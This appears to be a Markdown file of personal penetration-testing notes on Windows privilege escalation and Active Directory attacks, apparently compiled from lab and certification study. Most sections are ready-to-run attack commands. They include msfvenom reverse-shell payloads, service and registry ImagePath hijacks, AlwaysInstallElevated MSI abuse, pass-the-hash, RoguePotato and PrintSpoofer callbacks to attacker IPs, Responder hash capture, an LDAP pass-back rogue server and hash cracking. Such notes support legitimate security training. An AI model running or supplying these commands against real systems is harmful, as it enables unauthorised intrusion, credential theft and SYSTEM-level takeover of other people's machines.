### System Information

 - Windows includes a tool called Microsoft System Information (Msinfo32.exe).  This tool gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues

- The system information tab contains the `Environmental variables`.Environment variables store information about the operating system environment. This information includes details such as the operating system path, the number of processors used by the operating system, and the location of temporary folders.The environment variables store data that is used by the operating system and other programs. For example, the WINDIR environment variable contains the location of the Windows installation directory. Programs can query the value of this variable to determine where Windows operating system files are located.

### Monitoring Resource

- The application  is known as `Resource Monitor` and the executable is `resmon.exe`.Resource Monitor displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules. Advanced filtering allows users to isolate the data related to one or more processes (either applications or services), start, stop, pause, and resume services, and close unresponsive applications from the user interface. It also includes a process analysis feature that can help identify deadlocked processes and file locking conflicts so that the user can attempt to resolve the conflict instead of closing an application and potentially losing data

      python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

- Copy to the machine

      copy \\<your ip>\kali\<filename> <folder to send to>


### Abusing User's permissions

- To check a user's permission,use `accesschk.exe`

      accesschk.exe /accepteula -uwcqv user <service>

![image](https://github.com/user-attachments/assets/4b9a5bc3-af80-4f15-b6be-82f5b9be749c)

- Check if a binary runs with SYSTEM privileges

      sc qc [service name]
- Modify the config path to our reverseshell's path

      sc config [service name] binpath="\"<reverseshell path>\""

- Then net start `service name` to trigger it

![image](https://github.com/user-attachments/assets/1fa7dbed-e1de-4aa8-9bdb-44ded59ec6a2)

### Unquoted path services

- Exploiting services with unquoted paths

![image](https://github.com/user-attachments/assets/5115d234-5fe0-4daf-af3a-756660097559)

- Use `accesschk /accepteula -uwdq "[service name]"` to check for the user privileges

  ![image](https://github.com/user-attachments/assets/866a466f-3d86-4399-bb13-8087489395e6)

- Copy to the directory and rename with `Common.exe`

      copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

- use `net start [service}` to start shell.


### Weak Registry Permissions

- Write registry access can allow an attacker overwrite the image path registry key of a service . In this case service `regsvc` is vulnerable, group `NT AUTHORITY/INTERACTIVE` can overwrite registry Imagepath.

Command-:```accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc```

![image](https://github.com/user-attachments/assets/6a9b85dd-c13d-4760-85e9-436cbbad8ba8)

- Overwrite the image path

Command-:```reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f```

- Then, use `net start regsvc` to start revshell

![image](https://github.com/user-attachments/assets/efcddbb2-7a35-4bbf-a8f6-7d01cb1b9bfd)


### Insecure Service Executables

- An attacker can swap a services's binary executable with system privileges if it is writable by everyone.

![image](https://github.com/user-attachments/assets/fc1972d0-a859-41b7-9c17-e60c52d5061e)

- Copy and replace the binary with

`copy [path] [path] /Y`

- Start the service with `net start filepermsvc


### Registry Autoruns

- Query with `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` to query the registry for Autorun executables

![image](https://github.com/user-attachments/assets/e1d92284-a179-4105-9407-9a4821568a8d)

- Query with accesschk to see if it is writable by everyone

  Command-: ```C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"```

![image](https://github.com/user-attachments/assets/9d38a137-2369-456b-aeac-99ef3b93ffd4)

- Copy your reverse shell executable to the autorun executable path

- You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves


![image](https://github.com/user-attachments/assets/19321af4-8ba3-427d-afba-12c00530e99f)

### Using rdesktop to login to rdp

- Use:
  
      msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=[port] -f msi -o saucy.msi

![image](https://github.com/user-attachments/assets/2de086ab-a240-46df-b9b9-55baa9f1bde7)

### Registry AllElevated Keys

-  AlwaysInstallElevated" is a Windows Registry setting that affects the behavior of the Windows Installer service. The vulnerability arises when the "AlwaysInstallElevated" registry key is configured with a value of "1" in the Windows Registry.
When this registry key is enabled, it allows non-administrator users to install software packages with elevated privileges. In other words, users who shouldn't have administrative rights can exploit this vulnerability to execute arbitrary code with elevated permissions, potentially compromising the security of the system.

- To check this, use query `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` to check if the value is set to `1` or `0x1`.

![image](https://github.com/user-attachments/assets/e659baaa-85d0-45cf-ae60-a123bd769fa6)

- Generate `msi` with msfvenow syntax below-:

```bash
msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.0.2.4 LPORT=1337 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi
```
- Copy the msi payload and install with msiexec to trigger a reverse shelll

      msiexec /quiet /qn /i [msi's path]

- Shell

![image](https://github.com/user-attachments/assets/d8b07ea9-8e38-4e1f-a47f-4e2fb3497097)

- Sometimes you have to use the runas command to execute the file-: e.g Runas syntax-:

```cmd
runas /
user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-low
priv\priest.msi"
```

- Hashes result

![image](https://github.com/user-attachments/assets/d6f84f35-894d-4a50-93ab-b33ca79b9f45)


### Passing the hash

- You can use the hash to login instead of cracking the password,use `pth-winexe`

       pth-winexe -U "admin%[hash]" //[ip] cmd.exe

- Remember that the hash contains both the LM and NTLM hash seperated by colon

- Set up a socat redirector redirecting traffic from a port on your machine to another port on the victim machine

      sudo socat tcp-listen:[listening port],reuseaddr,fork tcp:[target-ip]:[port]

- Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account.

      C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe

![image](https://github.com/user-attachments/assets/bfd711a0-b618-4bec-86b8-11367034372f)

- Now, in the "local service" reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):

      C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999

### OFFSEC
### Windows Access Control

- Privileges on the Windows Operating System refers to permissions of a specific user to perform system related local operations.e.g add users, modifying file system.

### Concepts

- Server Identifier `[SID]`
- Mandatory Integrity Control
- User Access Control
- Access Token

### Server Identifier

- A `SID` is a unique value assigned to a group and user and authenticated by windows.In the case of `users` and `groups`, it is generated by `Local Security Authority` while Doamin users and groups are created by the domain controller.The SID is generated when the user is creted and cannot be tampered with.
- A SID is represented by letters SRXY and `-` acts a delimeter

```S-R-X-Y```

- Literal `S` indicates that the string is an SID
- Literal `R`stands for `revision` and that the overall SID structure is at its initial version.it is always set to 1.
- “X” determines the identifier authority. This is the authority that issues the SID. For example, “5” is 
the most common value for the identifier authority. It specifies `NT Authority` and is used for local 
or domain users and groups.
- “Y” represents the sub authorities of the identifier authority. Every SID consists of one or more sub 
authorities. This part consists of the domain identifier and relative identifier (RID). The domain 
identifier is the SID of the domain for domain users, the SID of the local machine for local users, 
and “32” for built-in principals. The RID determines principals such as users or groups.

## Example of a SID

```S-1-5-21-1336799502-1441772794-948155058-1001```

- Relative identifiers start with 1000.RID `1001` will be for the second user created on the server.
- There are SIDs that have a RID under 1000, which are called well-known SIDs.These SIDs identify generic and built-in groups and users instead of specific groups and users.

      S-1-0-0 Nobody 
      S-1-1-0 Everybody
      S-1-5-11 Authenticated Users
      S-1-5-18 Local System
      S-1-5-domainidentifier-500 Administrator

### ACCESS TOKEN
- Once a user gets authenticaed by Windows,a token gets generated with set of attributes which limits the type of operation carried out by the user.
- When a user starts a process or thread, a token will be assigned to these objects. This token, called a primary token, specifies which permissions the process or threads have when interacting with another object and is a copy of the access token of the user
- A thread can also have an impersonation token assigned. Impersonation tokens are used to provide a different security context than the process that owns the thread. This means that the thread interacts with objects on behalf of the impersonation token instead of the primary token of the process.

### Mandatory Access Control

- It uses integrity levels to determine control access to securable objects.When processes are started,they receive the integrity levels of the principal while performing the operations.
- Processes run on 4 integrity levels

      System: SYSTEM (kernel, ...)
      High: Elevated users
      Medium: Standard users
      Low: very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data

### User Access Control

- UAC is a Windows security feature that protects the operating system by running most applications and tasks with standard user privileges, even if the user launching them is an Administrator. For this, an administrative user obtains two access tokens after a successful logon. The first token is a standard user token (or filtered admin token), which is used to perform all non-privileged operations. The second token is a regular administrator token. It will be used when the user wants to perform a privileged operation. To leverage the administrator token, a 
UAC consent prompt needs to be confirmed.

### SITUATIONAL AWARENESS

- This involves understanding  the nature of the windows system to identify potential vectors for privilege escalation.
- Important stuffs to check  are:

  - Username and hostname
  - Group memberships of the current user
  - Existing users and groups
  - Operating system, version and architecture
  - Network information
  - Installed applications
  - Running processes

### Groups

- Use `whoami /GROUPS` to display the groups that the current user is a member of

### Users

- The next piece of information we are interested in are other users and groups on the system. We can use the `net user` command or the `Get-LocalUser` Cmdlet to obtain a list of all local users. Let’s use the latter by starting PowerShell and running Get-LocalUser

```bash
  powershell
  Get-LocalUser
```
### Enumerating Local Groups

- Use command `net LocalGroup` or `Get-LocalGroup` in powershell

### Examples of groups

- Members of Backup Operators can backup and restore all files on a computer, even those files 
they don’t have permissions for.
- Members of Remote Desktop Users can access the system with RDP, while members of Remote 
Management Users can access it with WinRM.

### View the members of a group with `Get-LocalGroupMember`

- Syntax-: ```Get-LocalGroupMember <Group's name>```

### Check the operating system, version, and architecture

- Use `systeminfo`

### Identify network interfaces, routes andactive network connections

- To list all network interfaces,use `ifconfig /all`
- To display the routing tables, use `route print`
- To list all active network connections we can use netstat753 with the argument -a to display all active TCP connections as well as TCP and UDP ports, -n to disable name resolution, and -o to show the process ID for each connection.Use `netstat -ano`

### Checking installed applications on a system

- For 64-bit and 32-bit applications , use

      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"  | select displayname
      Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  

- Finding running processes, use powershell `Get-Process` cmdlet
- The listed processes might not be complete.Check for files in the `c:/` directory
- Gather more data about user with `net user [username]`
- ` Remote Desktop Users or Remote Management Users` can access services like `RDP` or `WINRM`.
- Check Powershell history with-:`Get-History`
- Most Administrators use the Clear-History770 command to clear the PowerShell history. But this Cmdlet is only clearing PowerShell’s own history, which can be retrieved with Get-History. Starting with PowerShell v5, v5.1, and v7, a module named PSReadline771 is included, which is used for line-editing and command history functionality.Interestingly, Clear-History does not clear the command history recorded by `PSReadline`. Therefore, we can check if the user in our example misunderstood the Clear-History Cmdlet to clear all traces of previous commands.

```pwsh
(Get-PSReadlineOption).HistorySavePath
```

### Using RUNAS

------------------------------

- If a user is not part of the group `remote desktop Users of Remote Management Users` but you have access to GUI.`Runas` can be used to spawn a command as a user.Syntax-:

```pwsh
runas /user:[username] cmd
```

### Hidden in Plain view

-------------------------------

- Find files e.g ".txt,ini" with -: `Get-ChildItem`

```pwsh
Get-ChildItem -Path C:\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

### LDAP Bind Credentials

- LDAP auth is similar to NTLM AYTH,the application directly verifies the user's crenetials.The application has a set of creds that it uses to verify the AD user's creds.Although, non-microsoft applications that integrates wuth AD uses it. e.g
 - Gitlab
 - Jenkins
 - Custom-developed web applications
 - Printers
 - Vpns

- If this services are exposed to the internet,the same attacks leveraged on NTLM can be applied.Although, it opens up an additional attack to to grab the credentials to gain authenticated access to AD.

- Authentication process

![image](https://github.com/user-attachments/assets/f13bbc4b-c220-4018-9115-d3840e6b9590)

### LDAP Pass-back Attacks

- LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

- Netcat cannot be used to grab the creds.We need to create a rogue server.
- Use binary slapd to create a rogue server.TO install,use

```bash
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
#You will however have to configure your own rogue LDAP server on the AttackBox as well. We will start by reconfiguring the LDAP server using the following command:
sudo dpkg-reconfigure -p low slapd
```

- Config process,use

`sudo dpkg-reconfigure -p low slapd`

- Follow the process below

![image](https://github.com/user-attachments/assets/3188414d-c7d1-4dea-b554-53f0238d29c3)

- Set the server to recieve plain LOGIN credentials with an `ldif` file.

```ldif
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```
- Config meaning
  
    olcSaslSecProps: Specifies the SASL security properties
    noanonymous: Disables mechanisms that support anonymous login
    minssf: Specifies the minimum acceptable security strength with 0, meaning no protection.

- Path up the server with the command below

      sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

- Verify the credentials settings with

      ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms

### AUTHENTICATION RELAYS

### NETNTLM AUTHENTICATION OVER SMB

- Server Messsage Block allow users to communicate with a server via file shares.In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration. Even the "out of paper" alert your computer receives when you try to print a document is the work of the SMB protocol.
- However, the security of earlier versions of the SMB protocol was deemed insufficient. Several vulnerabilities and exploits were discovered that could be leveraged to recover credentials or even gain code execution on devices. Although some of these vulnerabilities were resolved in newer versions of the protocol, often organisations do not enforce the use of more recent versions since legacy systems do not support them. We will be looking at two different exploits for NetNTLM authentication with SMB:

  -  Since the NTLM Challenges can be intercepted, we can use offline cracking techniques to recover the password associated with the NTLM Challenge. However, this cracking process is significantly slower than cracking NTLM hashes directly.
  - We can use our rogue device to stage a man in the middle attack, relaying the SMB authentication between the client and server, which will provide us with an active authenticated session and access to the target server.

### Using Responder to poison  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected

- Responder allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to.On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, these protocols allow hosts to perform their own local DNS resolution for all hosts on the same local network. Rather than overburdening network resources such as the DNS servers, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond. However, Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. By poisoning these requests, Responder attempts to force the client to connect to our AttackBox. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication.

- Using responder requires syntax `sudo responder -i <interface>

![image](https://github.com/user-attachments/assets/edbdcdfd-1a24-428c-af2f-8f34572cefdc)

- If the responder triggers any error,try to stop the service running on that port

![image](https://github.com/user-attachments/assets/36be688c-7b4b-4425-bddb-8f5b58327510)

- Use one liner `ss --udp --tcp --listen --process` to spot ports running

![image](https://github.com/user-attachments/assets/21ff839b-a6f9-4b6f-b51e-128b267be9ea)

- Use hashcat to crack the NTLM hash or john

`hashcat -m 5600 <hash file> <password file> --force`

### MICROSOFT DEVELOPMENT TOOLKITS

- Large organisations need tools to deploy and manage the infrastructure of the estate. In massive organisations, you can't have your IT personnel using DVDs or even USB Flash drives running around installing software on every single machine. Luckily, Microsoft already provides the tools required to manage the estate. However, we can exploit misconfigurations in these tools to also breach AD.

### PXE BOOT

- Organizations use PXE boot to allow new devices that are connected to the network to load and install the OS directly over a network connection. MDT can be used to create, manage, and host PXE boot images. PXE boot is usually integrated with DHCP, which means that if DHCP assigns an IP lease, the host is allowed to request the PXE boot image and start the network OS installation process. The communication flow is shown in the diagram below:

![image](https://github.com/user-attachments/assets/5c82863a-3ffb-4d5c-99e4-8e7454f54769)

- The boot image can be received over tftp
- Once the process is performed, the client will use a TFTP connection to download the PXE boot image. We can exploit the PXE boot image for two different purposes:

    - Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
    - Perform password scraping attacks to recover AD credentials used during the install.

### Credentials in Configuration files

- The target in this scenario is a Mcafee's database

- Copy to your host machine with scp `secure copy`

  `scp <user>@<host>:<c:\<file>> `

- Using sqlite3 to check user values, use `.open <db_name>` to open a db

### Weirdstuff

---------------

- `Certutil` gets filtered by AV while `iwr` doesn't get bypassed.

```powershell
iwr http://10.8.36.31:8002/PrintSpoofer64.exe -Outfile C:\Users\Bob\Desktop\PrintSpoofer64.exe
```

### SEIMPERSONATE privilege exploitation with printspoofer

--------------

- An account that has the SeImpersonate privilege enabled has the ability to impersonate another client after authentication. This means that this privilege allows the account to impersonate other accounts, so long as they have authenticated. Whenever a user authenticates to a host, a token (logon sessions inside the LSASS process) resides on the system until the next restart.

### Interactive shell with rlwrap

-----------------

- Use `sudo rlwrap -cAr nc -nlvp 1337`

![image](https://github.com/user-attachments/assets/eeeb1cc2-71ed-420e-9386-9007deaf600b)

------------------

### Post Exploitation

------------------- 

- Bypass powershell execution policy with-:

```powershell
powershell -ep bypass
```
- Start powerview with

```powershell
Import-Module .\PowerView.ps1
```

- Enumerate the domain user with-:

```powershell
Get-NetUser | select cn
```

![image](https://github.com/user-attachments/assets/59a719fa-b85f-47c0-80c5-2b9c9e18d4c0)

- Enumerate Domain groups

```powershell
Get-NetGroup -GroupName *admin*
```

![image](https://github.com/user-attachments/assets/2c352812-a69f-40d4-a196-66a482331f96)

- Enumerating more, use [cheatsheet]( https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993) and [here](https://www.hackingarticles.in/active-directory-enumeration-powerview/)

- Enumerating shares in AD-:

```
Invoke-ShareFinder
```

![image](https://github.com/user-attachments/assets/8efc7b0a-13b5-4dfe-acfe-0c4fc641a6c1)

- Enumerating the windows os on AD-:

```
Get-NetComputer -fulldata | select operatingsystem
```

### Bloodhound

---------------------

- Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.
- Installing bloodhound-:

```bash
apt-get install bloodhound
neo4j console #- default credentials -> neo4j:neo4j
```
- Starting bloodhound, I suggest you run with the latest Bloodhound [scripts](https://github.com/SpecterOps/SharpHound/releases)

```
powershell -ep bypass
Import-Module .\SharpHound.ps1    
Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
```

![image](https://github.com/user-attachments/assets/964f266d-97b7-4154-a62d-c4200677c289)

- Copy to your machine
- Now, run `bloodhound`, creds is defualt-: `neo4j:neo4j`, the current bloodhound version requires you to change password of neo4j db.The highlighted part is the import part.

![image](https://github.com/user-attachments/assets/1cffa30d-7999-4544-b33a-3e380c9f928d)

- Drag and drop works too

- Bloodhound post processing [error](https://github.com/SpecterOps/BloodHound-Legacy/issues/724) fix.Try to delete the `computers.json` file before uploading the `loot.zip` Check analysis for queries to try-:
